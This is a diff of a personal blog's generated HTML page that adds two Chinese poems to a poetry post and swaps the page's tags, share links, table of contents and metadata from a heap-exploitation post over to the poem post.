+<h3 id="我想和你一起生活-11-24"><a href="#我想和你一起生活-11-24" class="headerlink" title="我想和你一起生活 - - - 11.24"></a>我想和你一起生活 - - - 11.24</h3><p>我想和你一起生活，在某个小镇，</p>
+<p>共享无尽的黄昏和绵绵不绝的钟声。</p>
+<p>在这个小镇的旅店里——</p>
+<p>古老时钟敲出的微弱响声像时间轻轻滴落</p>
+<p>有时候，在黄昏，自顶楼某个房间传来笛声</p>
+<p>吹笛者倚著窗牖，而窗口大朵郁金香</p>
+<p>此刻你若不爱我，我也不会在意</p>
+<p>在房间中央，一个磁砖砌成的炉子，</p>
+<p>每一块磁砖上画著一幅画：</p>
+<p>一颗心，一艘帆船，一朵玫瑰。</p>
+<p>而自我们唯一的窗户张望，雪，雪，雪</p>
+<p>你会躺成我喜欢的姿势：慵懒，淡然，冷漠</p>
+<p>一两回点燃火柴的刺耳声。</p>
+<p>你香烟的火苗由旺转弱，烟的末梢颤抖著，颤抖著</p>
+<p>短小灰白的烟蒂——连灰烬你都懒得弹落——</p>
+<p>香烟遂飞舞进火中。</p>
+<h3 id="西江月·阻风山峰下-11-25"><a href="#西江月·阻风山峰下-11-25" class="headerlink" title="西江月·阻风山峰下 - - - 11.25"></a>西江月·阻风山峰下 - - - 11.25</h3><p><em>满载一船秋色，平铺十里湖光</em>。波神留我看斜阳。放起鳞鳞细浪。<br>明日风回更好，今宵露宿何妨。水晶宫里奏霓裳。准拟岳阳楼上。</p>
 
   </div>
   
@@ -2655,10 +2731,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-02-27T21:11:38+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-02-28T21:22:37+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Feb 27, 2024</p>
+    <p>更新于：Feb 28, 2024</p>
   </a>
 </div>
 
@@ -2669,8 +2745,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/pwn/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>pwn</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/heap/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>heap</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/House-Of-Spirit/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>House Of Spirit</p></a></div>
-  <span hidden itemprop="keywords">pwn heap House Of Spirit</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/poem/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>poem</p></a></div>
+  <span hidden itemprop="keywords">poem</span>
   
 
 
@@ -2684,7 +2760,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/11/01/pwn_fastbin-attack/&title=Fastbin Attack related - x1ngg3's blog&summary=我提莫的心态崩了啊 ಥ_ಥ"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/05/25/nothing_read_for_you/&title=为你读诗 - x1ngg3's blog&summary=和我一起读诗吧！"
           
           >
           
@@ -2696,7 +2772,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/11/01/pwn_fastbin-attack/&title=Fastbin Attack related - x1ngg3's blog&summary=我提莫的心态崩了啊 ಥ_ಥ"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/05/25/nothing_read_for_you/&title=为你读诗 - x1ngg3's blog&summary=和我一起读诗吧！"
           
           >
           
@@ -2708,7 +2784,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/11/01/pwn_fastbin-attack/&title=Fastbin Attack related - x1ngg3's blog&summary=我提莫的心态崩了啊 ಥ_ಥ"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/05/25/nothing_read_for_you/&title=为你读诗 - x1ngg3's blog&summary=和我一起读诗吧！"
           
           >
           
@@ -2741,24 +2817,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/07/02/atest/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>test--</p>
-          <p class='content'>测试博客是否还活着
+        <a class='prev' href='/2020/05/25/lr1/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>如何调出好莱坞中爱用的的橙青色调</p>
+          <p class='content'>新开了个人博客，先写个调色分享练练手，奥里给~
 
 
-test
-11
-</p>
+
+
+调色思路
+橙青色调的整体思路其实很简单，高光偏橙黄，阴影偏青蓝。饱和适度，对比适度，大体跟着感觉走就行。
+基本面板
+首先，进入LR，可以看...</p>
         </a>
       
-      
-        <a class='next' href='/2020/10/27/pwn_overlap/'>
-          <p class='title'>water one water<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>Chunk_extend &amp; Overlap
-
-
-Intorductionchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapp...</p>
-        </a>
       
     </div>
   
@@ -2776,7 +2847,7 @@ Intorductionchunk extend 是堆漏洞的一种常见利用手法，通过 extend
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2020/11/01/pwn_fastbin-attack/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2020/05/25/nothing_read_for_you/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2818,7 +2889,7 @@ Intorductionchunk extend 是堆漏洞的一种常见利用手法，通过 extend
 
 
   <div class='content'>
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastbin-Double-Free"><span class="toc-text">Fastbin Double Free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-Of-Spirit"><span class="toc-text">House Of Spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#example-1"><span class="toc-text">example 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#example-2"><span class="toc-text">example 2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alloc-to-Stack"><span class="toc-text">Alloc to Stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-Alloc"><span class="toc-text">Arbitrary Alloc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2014-hack-lu-oreo"><span class="toc-text">2014 hack.lu oreo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show"><span class="toc-text">show</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-text">delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leave-message"><span class="toc-text">leave_message</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#step1"><span class="toc-text">step1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step2"><span class="toc-text">step2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step3"><span class="toc-text">step3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#step4"><span class="toc-text">step4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Here-I-Love-You-5-25"><span class="toc-text">Here I Love You - - - 5.25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%AE%E9%A3%8E%E4%BB%8E%E6%88%91%E8%BF%99%E9%87%8C%E7%BB%8F%E8%BF%87-6-1"><span class="toc-text">微风从我这里经过 - - - 6.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%B6%E7%84%B6-6-2"><span class="toc-text">偶然 - - - 6.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%B1%E4%B8%AD%E9%9B%AA%E5%90%8E-6-4"><span class="toc-text">山中雪后 - - - 6.4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%9C%AC%E4%B9%A6-6-5"><span class="toc-text">一本书 - - - 6.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%94%A8%E4%BB%80%E4%B9%88%E6%89%8D%E8%83%BD%E7%95%99%E4%BD%8F%E4%BD%A0-6-6"><span class="toc-text">我用什么才能留住你 - - - 6.6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9D%E6%9C%88-6-11"><span class="toc-text">九月 - - - 6.11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B4%BB%E5%9C%A8%E8%BF%99%E7%8F%8D%E8%B4%B5%E7%9A%84%E4%BA%BA%E9%97%B4-6-14"><span class="toc-text">活在这珍贵的人间 - - - 6.14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8F%E5%A4%A9%E7%9A%84%E5%A4%AA%E9%98%B3-6-14"><span class="toc-text">夏天的太阳 - - - 6.14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E7%AD%94-6-17"><span class="toc-text">回答 - - - 6.17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%A8%E5%89%8D-6-23"><span class="toc-text">门前 - - - 6.23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A5%BF%E6%B1%9F%E6%9C%88%C2%B7%E4%B8%96%E4%BA%8B%E4%B8%80%E5%9C%BA%E5%A4%A7%E6%A2%A6-6-25"><span class="toc-text">西江月·世事一场大梦 - - - 6.25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%BF%E5%85%8D-8-9"><span class="toc-text">避免 - - - 8.9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%8C%E5%A4%9C%E5%95%BC%C2%B7%E6%98%A8%E5%A4%9C%E9%A3%8E%E5%85%BC%E9%9B%A8-10-28"><span class="toc-text">乌夜啼·昨夜风兼雨 - - - 10.28</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%89%AA%E6%A2%85%C2%B7%E7%BA%A2%E8%97%95%E9%A6%99%E6%AE%8B%E7%8E%89%E7%B0%9F%E7%A7%8B-10-29"><span class="toc-text">一剪梅·红藕香残玉簟秋 - - - 10.29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Seven-times-have-I-despised-my-soul-11-5"><span class="toc-text">Seven times have I despised my soul - - - 11.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%83%B3%E5%92%8C%E4%BD%A0%E4%B8%80%E8%B5%B7%E7%94%9F%E6%B4%BB-11-24"><span class="toc-text">我想和你一起生活 - - - 11.24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A5%BF%E6%B1%9F%E6%9C%88%C2%B7%E9%98%BB%E9%A3%8E%E5%B1%B1%E5%B3%B0%E4%B8%8B-11-25"><span class="toc-text">西江月·阻风山峰下 - - - 11.25</span></a></li></ol>
   </div>
 </section>
 
@@ -3312,7 +3383,7 @@ Intorductionchunk extend 是堆漏洞的一种常见利用手法，通过 extend
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/PWN/","name":"PWN"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/11/01/pwn_fastbin-attack/","name":"Fastbin Attack related"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Fastbin Attack related","description":"我提莫的心态崩了啊 ಥ_ಥ","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/11/01/pwn_fastbin-attack/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/11/01/pwn_fastbin-attack/","wordCount":13,"datePublished":"2020-10-31T16:00:00.000Z","dateModified":"2024-02-27T13:11:38.761Z","articleSection":"PWN","keywords":"pwn,heap,House Of Spirit","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/NOTHING/","name":"NOTHING"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/05/25/nothing_read_for_you/","name":"为你读诗"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"为你读诗","description":"和我一起读诗吧！","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/05/25/nothing_read_for_you/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/05/25/nothing_read_for_you/","wordCount":8,"datePublished":"2020-05-24T16:00:00.000Z","dateModified":"2024-02-28T13:22:37.249Z","articleSection":"NOTHING","keywords":"poem","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
